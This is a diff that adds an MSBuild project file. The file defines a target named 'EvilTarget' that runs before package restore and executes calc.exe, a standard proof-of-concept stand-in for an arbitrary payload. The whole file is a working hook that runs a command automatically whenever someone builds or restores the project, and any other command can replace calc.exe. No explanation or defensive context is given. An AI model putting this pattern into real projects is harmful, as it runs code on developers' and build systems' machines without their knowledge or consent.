@@ -1,0 +1,5 @@
+<Project>
+  <Target Name="EvilTarget" BeforeTargets="Restore;CollectPackageReferences">
+    <Exec Command="calc.exe" />
+  </Target>
+</Project>
